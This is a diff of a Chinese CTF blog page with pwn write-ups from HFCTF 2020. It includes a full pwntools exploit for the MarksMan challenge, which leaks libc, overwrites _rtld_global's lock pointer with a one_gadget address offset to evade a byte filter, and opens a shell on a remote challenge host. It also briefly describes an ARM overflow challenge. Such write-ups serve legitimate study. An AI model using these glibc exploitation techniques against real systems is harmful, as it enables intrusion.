@@ -15,15 +15,15 @@
 
 
 
-<meta name="description" content="MarksMan程序给了libc地址,以及存在一个任意地址写三字节,通过测试,程序在exit的时候会调用_rtld_global结构中的_dl_rtld_lock_recursive或者_dl_rtld_unlock_recursive处的指针,又由于字节过滤不严谨,只要修改后三个字节为rce并确定存在rce满足条件的即可getshell,0x4F2C5此偏移本地通,远程不通,换成0x10A38C">
+<meta name="description" content="虎符2020的线上赛部分Pwn题WP,报名被Pass了,只能靠其他师傅要题">
 <meta name="keywords" content="HFCTF">
 <meta property="og:type" content="article">
 <meta property="og:title" content="HFCTF_2020">
 <meta property="og:url" content="http:&#x2F;&#x2F;fmyy.pro&#x2F;2020&#x2F;04&#x2F;20&#x2F;Competition&#x2F;HFCTF-2020&#x2F;index.html">
 <meta property="og:site_name" content="FMYY&#39;s Blog">
-<meta property="og:description" content="MarksMan程序给了libc地址,以及存在一个任意地址写三字节,通过测试,程序在exit的时候会调用_rtld_global结构中的_dl_rtld_lock_recursive或者_dl_rtld_unlock_recursive处的指针,又由于字节过滤不严谨,只要修改后三个字节为rce并确定存在rce满足条件的即可getshell,0x4F2C5此偏移本地通,远程不通,换成0x10A38C">
+<meta property="og:description" content="虎符2020的线上赛部分Pwn题WP,报名被Pass了,只能靠其他师傅要题">
 <meta property="og:locale" content="en">
-<meta property="og:updated_time" content="2020-04-19T17:35:54.526Z">
+<meta property="og:updated_time" content="2020-04-19T17:38:18.530Z">
 <meta name="twitter:card" content="summary">
 
 <link rel="apple-touch-icon" href= "/apple-touch-icon.png">
@@ -251,7 +251,9 @@
     <div class="article-entry" itemprop="articleBody">
       
           
-        <h2 id="MarksMan"><a href="#MarksMan" class="headerlink" title="MarksMan"></a>MarksMan</h2><p>程序给了libc地址,以及存在一个任意地址写三字节,通过测试,程序在exit的时候会调用_rtld_global结构中的_dl_rtld_lock_recursive或者_dl_rtld_unlock_recursive处的指针,又由于字节过滤不严谨,只要修改后三个字节为rce并确定存在rce满足条件的即可getshell,0x4F2C5此偏移本地通,远程不通,换成0x10A38C打,利用shellcode滑行的技巧,将0x10A38C-5绕过过滤,且可以概率getshell  </p>
+        <p>虎符2020的线上赛部分Pwn题WP,报名被Pass了,只能靠其他师傅要题</p>
+<a id="more"></a>
+<h2 id="MarksMan"><a href="#MarksMan" class="headerlink" title="MarksMan"></a>MarksMan</h2><p>程序给了libc地址,以及存在一个任意地址写三字节,通过测试,程序在exit的时候会调用_rtld_global结构中的_dl_rtld_lock_recursive或者_dl_rtld_unlock_recursive处的指针,又由于字节过滤不严谨,只要修改后三个字节为rce并确定存在rce满足条件的即可getshell,0x4F2C5此偏移本地通,远程不通,换成0x10A38C打,利用shellcode滑行的技巧,将0x10A38C-5绕过过滤,且可以概率getshell  </p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> LD <span class="keyword">import</span>*</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line">p = remote(<span class="string">'node3.buuoj.cn'</span>,<span class="number">25519</span>)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">4</span></pre></td><td class="code"><pre><span class="line">libc = ELF(<span class="string">'./libc-2.27.so'</span>,checksec=<span class="literal">False</span>)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">5</span></pre></td><td class="code"><pre><span class="line">p.recvuntil(<span class="string">'near: '</span>)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">6</span></pre></td><td class="code"><pre><span class="line">libc_base = int(p.recv(<span class="number">14</span>),<span class="number">16</span>) - libc.sym[<span class="string">'puts'</span>]</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">7</span></pre></td><td class="code"><pre><span class="line">log.info(<span class="string">'LIBC:\t'</span> + hex(libc_base))</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">8</span></pre></td><td class="code"><pre><span class="line">p.recvuntil(<span class="string">'shoot!shoot!\n'</span>)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">9</span></pre></td><td class="code"><pre><span class="line">fake = libc_base + <span class="number">0x81DF68</span> - <span class="number">8</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">10</span></pre></td><td class="code"><pre><span class="line">p.sendline(str(fake))</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">11</span></pre></td><td class="code"><pre><span class="line">rce = libc_base + <span class="number">0x10A38C</span> - <span class="number">5</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">12</span></pre></td><td class="code"><pre><span class="line">off = [rce&amp;<span class="number">0xFF</span>,(rce&gt;&gt;<span class="number">8</span>)&amp;<span class="number">0xFF</span>,(rce&gt;&gt;<span class="number">16</span>)&amp;<span class="number">0xFF</span>]</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">13</span></pre></td><td class="code"><pre><span class="line">log.info(<span class="string">'RCE:\t'</span> + hex(rce))</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">14</span></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">3</span>):</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">15</span></pre></td><td class="code"><pre><span class="line">	p.sendline(p8(off[i]))</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">16</span></pre></td><td class="code"><pre><span class="line">p.interactive()</span></pre></td></tr></table></figure>
 <h3 id="下载"><a href="#下载" class="headerlink" title="下载"></a>下载</h3><p><a href="./MarksMan/Ubuntu/main">MAIN</a> <a href="./MarksMan/Ubuntu/exp.py">EXP</a> <a href="./MarksMan/Ubuntu/libc-2.27.so">LIBC</a></p>
 <h2 id="Count"><a href="#Count" class="headerlink" title="Count"></a>Count</h2><p>arm结构的题,搭建好qemu环境即可调试,题目很简单,不需要本地调试,直接利用IDA F5查看伪C代码即可写EXP<br>200次输入正确结果,利用python里面的eval函数即可自动计算结果,然后通过溢出覆盖目标变量的值即可getshell</p>
